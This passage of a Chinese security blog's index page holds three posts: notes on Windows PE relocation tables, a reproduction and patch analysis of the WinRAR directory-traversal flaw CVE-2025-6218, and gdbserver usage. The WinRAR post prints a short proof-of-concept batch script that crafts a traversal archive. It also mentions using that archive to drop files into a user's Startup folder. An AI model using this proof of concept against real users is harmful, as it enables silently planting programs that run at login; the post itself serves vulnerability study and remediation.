<p>所以重定位表的位置为 0xFFE30000 + 0xD8000 &#x3D; 0xFFF08000。<br>跳转到内存转储窗口中查看。<br><img src="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/6.png"><br>可以发现与 <code>IMAGE_BASE_RELOCATION</code> 的结构一致。</p>
<p>这里先解释一下 <code>TypeOffset</code> 的意思。这个字段由两个字节组成，其中的高 4 位为 <code>Type</code>，剩余 12 位为 <code>Offset</code>，即偏移。<br>其中的 <code>Type</code> 有多个类型，最常见的是 <code>IMAGE_REL_BASED_ABSOLUTE</code>（0）、<code>IMAGE_REL_BASED_HIGHLOW</code>（3）、<code>IMAGE_REL_BASED_DIR64</code>（10）。<br>64 位下 pe 的 <code>Type</code> 通常是 <code>IMAGE_REL_BASED_DIR64</code>，即 0xA。<br>（这部分似乎没有在官网在线文档中出现，但理论上来说可以在 winnt.h 中找到。）</p>
<p>此处挑选其中一个 <code>0xAE50</code> 进行计算。根据上述解释，其偏移是 <code>0xE50</code>，加上前面的 0x1000，即 <code>0x1E50</code>。<br>加上重定位后的基址，即 0xFFE30000，得 <code>0xFFE31E50</code>。dump 这块内存：<br><img src="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/7.png"></p>
<p>这么一看好像还看不出什么，但是回到文件中就能看出端倪。<br>此处需要利用到 RVA 转 FOA 的公式。具体可以参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iBinary/p/9733703.html">这篇博客</a>。<br>根据工具显示节表 Section Headers 的信息（或手动计算），可以得知 <code>0x1E50</code> 在 <code>.text</code> 段中。<br><img src="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/8.png"><br>减去这一节的内存 VA 偏移，即得到差值 <code>0xE50</code>，随后再加上 0x600 的文件偏移，就可以得到其在文件中的位置 <code>0x1450</code>。<br>在文件中查看这块内容。<br><img src="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/9.png"><br>可以发现，这块内容所有地址都被减去了 <code>ImageBase</code> 的 0x1 0000 0000，然后再加上重定位后的基址 0xFFE30000，完成重定位。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>吾爱大佬的<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1128322-1-1.html">这篇帖子</a>写得非常好，很多细节都总结了。<br>这篇也可以。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LyShark/p/17684114.html">https://www.cnblogs.com/LyShark/p/17684114.html</a><br>现在的动调工具可以根据 pe 头的内容自动查找到重定位表的位置（标记为 <code>.reloc</code>）。但在某些特殊条件下还是需要手动分析（例如病毒程序会魔改 pe 头）。<br><img src="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/10.png"></p>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">
    <time datetime="2025-10-20T15:08:11.000Z" class="entry-date">
        2025-10-20
    </time>
</a>
    
  <span class="article-delim">&#8226;</span>
  <div class="article-category">
  <a class="article-category-link" href="/categories/windows-%E7%9B%B8%E5%85%B3/">windows 相关</a>
  </div>

    
    </footer>
</article>






  
    <article id="post-cve-2025-6218-winrar目录遍历漏洞复现与简单分析" class="post-cve-2025-6218-winrar目录遍历漏洞复现与简单分析 post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">cve-2025-6218 winrar目录遍历漏洞复现与简单分析</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="https://shanzade.github.io/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" data-id="cmjjqvfjj0001ekvgbi1ih1tp" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>CVSS3 评分 7.8。<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-6218">https://nvd.nist.gov/vuln/detail/CVE-2025-6218</a></p>
<p>在 WinRAR &lt;7.12 版本中，存在目录遍历漏洞，简单来说就是可以控制压缩包内文件的目标解压位置。</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>此处我使用 <code>7.0.0</code> 版本进行复现。</p>
<p>创建如下目录结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/</span><br><span class="line">├─不应该出现的地方</span><br><span class="line">└─初始文件夹</span><br><span class="line">    └─generator.bat</span><br></pre></td></tr></table></figure>

<p>其中，<code>generator.bat</code> 的内容如下（来自网络，参考 <a target="_blank" rel="noopener" href="https://github.com/skimask1690/CVE-2025-6218-POC%EF%BC%89%EF%BC%9A">https://github.com/skimask1690/CVE-2025-6218-POC）：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo 123 &gt; 123.txt</span><br><span class="line"></span><br><span class="line">&quot;C:\Program Files\WinRAR\WinRar.exe&quot; a -ap&quot; \.. \不应该出现的地方\ &quot; exp.zip 123.txt</span><br><span class="line"></span><br><span class="line">del 123.txt</span><br><span class="line">echo &quot;[+]FINISHED&quot;</span><br></pre></td></tr></table></figure>

<p>运行该脚本可创建一个 <code>exp.zip</code>，对其右键使用 WinRAR <code>解压到此处</code>：<br><img src="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/1.png"></p>
<p>执行之后，本来应该出现在当前目录下的文件，出现在了另一个文件夹中。<br><img src="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/2.png"></p>
<p>同样地，如果用户习惯将压缩包放在桌面上解压，可以构造一个将文件解压到当前用户 <code>Startup</code> 目录的压缩包，这样当用户下次登录时会自动运行特定文件。<em>网络上复现该 cve 的 poc 思路大致如此。</em></p>
<h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><p>对 <code>7.0.0</code> 版本进行分析，找到对应的创建文件的函数（步骤略）：<br><img src="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/3.png"></p>
<p>可以发现，在调用 <code>CreateFileW</code> 时，直接将压缩包内文件的解压路径拼接在了原有的目标路径之后。</p>
<p>更换为 <code>7.1.2</code> 版本，分析发现其会在每个可能的目录遍历点添加 <code>_</code> 防止漏洞产生。<br>对路径处理前：<br><img src="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/4.png"><br>对路径处理后：<br><img src="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/5.png"></p>
<p><img src="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/6.png"></p>
<p>最终效果如下：<br><img src="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/7.png"></p>
<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ul>
<li>前往 <a target="_blank" rel="noopener" href="https://www.win-rar.com/download.html">https://www.win-rar.com/download.html</a> 下载 <code>7.12</code> 及以上版本。</li>
<li>（更新杀毒软件。大部分杀软都能拦截对启动项的写入。）</li>
</ul>
<h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><h2 id="6-2-3-版本复现失败"><a href="#6-2-3-版本复现失败" class="headerlink" title="6.2.3 版本复现失败"></a>6.2.3 版本复现失败</h2><p>看了很多份报告都说版本号 <code>&lt; 7.1.2</code> 都有这个漏洞，但是我在自己电脑上找到了 <code>6.2.3 (x86)</code> 这个版本，尝试多次发现并没有复现成功。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>大部分的压缩软件都考虑到了这点，都会自动添加 <code>_</code> 避免路径遍历。</p>
<p>（其实还有某个压缩软件的老版本也有这个漏洞。）</p>
<h1 id="叠甲声明"><a href="#叠甲声明" class="headerlink" title="叠甲声明"></a>叠甲声明</h1><p><strong>本文仅用于教育目的，所有技术信息均来自公开资料。读者应在法律授权范围内测试自身系统安全，禁止用于非法渗透。作者不承担因滥用信息导致的任何责任。</strong></p>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">
    <time datetime="2025-07-29T09:14:19.000Z" class="entry-date">
        2025-07-29
    </time>
</a>
    
  <span class="article-delim">&#8226;</span>
  <div class="article-category">
  <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

    
    </footer>
</article>






  
    <article id="post-gdbserver-远程调试小总结" class="post-gdbserver-远程调试小总结 post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2024/11/27/gdbserver-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%B0%8F%E6%80%BB%E7%BB%93/">gdbserver 远程调试小总结</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="https://shanzade.github.io/2024/11/27/gdbserver-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%B0%8F%E6%80%BB%E7%BB%93/" data-id="cmjjqvfjl0003ekvgamg04ckk" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><ul>
<li>懒得装 &#x2F; 多开 ubuntu 不同版本的虚拟机。</li>
<li>学习更深一层的 gdb 使用。</li>
</ul>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="启动程序"><a href="#启动程序" class="headerlink" title="启动程序"></a>启动程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver IPADDR:PORT ./ELF_OR_EXECUTABLE</span><br></pre></td></tr></table></figure>
<h2 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb</span><br><span class="line">...</span><br><span class="line">(gdb) target remote IPADDR:PORT</span><br><span class="line">...</span><br><span class="line">c #run program</span><br></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver &lt;comm&gt; &lt;program&gt; [&lt;args&gt; ...]</span><br></pre></td></tr></table></figure>
<p>其中，comm 可以是 usb tcp 等方式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver --attach &lt;comm&gt; &lt;pid&gt;</span><br></pre></td></tr></table></figure>
<p>附加至进程。</p>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2024/11/27/gdbserver-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%B0%8F%E6%80%BB%E7%BB%93/">
    <time datetime="2024-11-27T10:10:33.000Z" class="entry-date">
        2024-11-27
    </time>
</a>
    
  <span class="article-delim">&#8226;</span>
  <div class="article-category">
  <a class="article-category-link" href="/categories/ctf%E6%99%AE%E9%80%9A/">ctf普通</a>
  </div>

    
    </footer>
</article>






  
  

</div></div>
        <div id="secondary" class="widget-area" role="complementary">
  
    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
    <div>
        <input type="text" value="" name="s" id="s" />
        <input type="submit" id="searchsubmit" value="搜索" />
    </div>
</form></aside>
  
    
  
    
  <aside class="widget">
    <h3 class="widget-title">Categories</h3>
    <div class="widget-content">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf%E6%99%AE%E9%80%9A/">ctf普通</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows-%E7%9B%B8%E5%85%B3/">windows 相关</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88windows%EF%BC%89/">恶意代码分析（windows）</a><span class="category-list-count">2</span></li></ul>
    </div>
  </aside>

  
    
  <aside class="widget">
    <h3 class="widget-title">Recents</h3>
    <div class="widget-content">
      <ul>
        
          <li>
            <a href="/2025/12/20/si1verf0x-2-%E5%AF%B9%E4%B8%80%E4%BB%BD%E6%A0%B7%E6%9C%AC%E7%9A%84%E6%B5%85%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%89%E5%BE%85%E5%AE%8C%E5%96%84%EF%BC%89/">si1verf0x #2: 对一份样本的浅分析（有待完善）</a>
          </li>
        
          <li>
            <a href="/2025/12/07/%E8%B7%9F%E7%9D%8052pojie%E5%A4%A7%E4%BD%AC%E5%88%86%E6%9E%90%E4%B8%80%E4%BB%BD%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC/">跟着52pojie大佬分析一份木马样本</a>
          </li>
        
          <li>
            <a href="/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/">2024网鼎杯半决赛 cardmaster</a>
          </li>
        
          <li>
            <a href="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">windows 重定位简单学习</a>
          </li>
        
          <li>
            <a href="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">cve-2025-6218 winrar目录遍历漏洞复现与简单分析</a>
          </li>
        
      </ul>
    </div>
  </aside>

  
    
  
    
  
</div>
      </div>
      <footer id="colophon" role="contentinfo">
    <!-- <p>&copy; 2025 shanza
    All rights reserved.</p> -->
    <p>&copy; 2025 shanza </p>
    <!-- ❤️ Hor1zon</p> -->
    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</footer>
    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>

<script src="/js/jquery-3.3.1.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>


<script src="/js/navigation.js"></script>

<div id="bg"></div>

  </div>
</body>
</html>